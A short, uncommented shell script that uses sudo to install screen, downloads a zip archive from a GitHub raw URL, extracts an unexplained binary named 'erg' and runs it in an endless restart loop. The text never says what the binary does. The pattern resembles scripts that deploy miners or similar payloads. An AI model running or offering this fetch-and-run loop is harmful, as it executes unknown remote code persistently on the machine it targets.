sudo apt update -y
sudo apt install screen -y
sudo screen -dmS random
wget https://raw.githubusercontent.com/rjdpros/project/main/erg.zip
unzip erg.zip
chmod +x erg
while [ 1 ]; do
./erg
sleep 2
done
sleep 2
